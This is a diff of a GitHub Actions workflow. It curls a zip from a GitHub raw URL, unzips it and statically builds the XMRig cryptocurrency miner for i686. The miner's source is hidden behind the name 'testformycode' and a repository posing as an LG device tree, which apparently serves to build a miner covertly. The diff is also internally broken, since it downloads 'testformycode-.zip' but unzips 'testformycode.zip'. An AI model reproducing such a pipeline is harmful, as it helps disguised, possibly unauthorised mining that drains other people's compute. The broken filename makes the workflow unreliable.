@@ -22,22 +22,22 @@ jobs:
 
       - name: Download and Unzip Source Code
         run: |
-          curl -L -o testformycode-32.zip https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode-32.zip
-          unzip testformycode-32.zip
+          curl -L -o testformycode-.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode.zip
+          unzip testformycode.zip
 
       - name: Build Project for i686
         run: |
-          cd testformycode-32/scripts
+          cd testformycode/scripts-32
           chmod 777 *.sh
           ./build_deps.sh
           cd ..
           mkdir build
           cd build
-          cmake -DXMRIG_DEPS=scripts/deps -DCMAKE_C_FLAGS="-m32 -static" -DCMAKE_CXX_FLAGS="-m32 -static" -DCMAKE_EXE_LINKER_FLAGS="-m32 -static" ..
+          cmake -DXMRIG_DEPS=scripts-32/deps -DCMAKE_C_FLAGS="-m32 -static" -DCMAKE_CXX_FLAGS="-m32 -static" -DCMAKE_EXE_LINKER_FLAGS="-m32 -static" ..
           make
 
       - name: Upload Build Artifacts
         uses: actions/upload-artifact@v3
         with:
           name: build-output
-          path: testformycode-32/build
+          path: testformycode/build
